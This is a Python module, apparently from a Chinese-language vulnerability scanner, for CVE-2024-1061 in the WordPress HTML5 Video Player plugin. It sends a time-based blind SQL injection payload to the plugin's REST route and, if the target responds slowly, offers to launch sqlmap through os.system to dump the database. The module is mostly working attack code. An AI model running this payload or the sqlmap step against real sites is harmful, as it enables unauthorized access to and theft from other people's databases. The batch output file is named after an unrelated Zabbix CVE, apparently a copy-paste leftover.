#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2024_1061:
    def get_url(self,input_url):
        try:
            url = input_url + "/?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+"
            stime = time.time()
            
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            
            etime = time.time()
            restime = etime-stime
            if restime >10:
                if not self.batch:
                    OutPrintInfoSuc("WordPress", '目标存在WordPress Plugin HTML5 Video Player SQL注入漏洞')
                    OutPrintInfo("WordPress", url)
                else:
                    OutPrintInfoSuc("WordPress", f'目标存在CVE-2024-1061漏洞: {url}')
                    OutPutFile("zabbix_2016_10134.txt",f'目标存在WordPress Plugin HTML5 Video Player SQL注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在WordPress Plugin HTML5 Video Player SQL注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测WordPress Plugin HTML5 Video Player SQL注入漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/?rest_route=/h5vp/v1/view/1&id=1\'+AND+(SELECT+1+FROM+(SELECT(*))a)--+" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(*))a)--+\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("WordPress", 'WordPress Plugin HTML5 Video Player SQL注入漏洞检测结束')

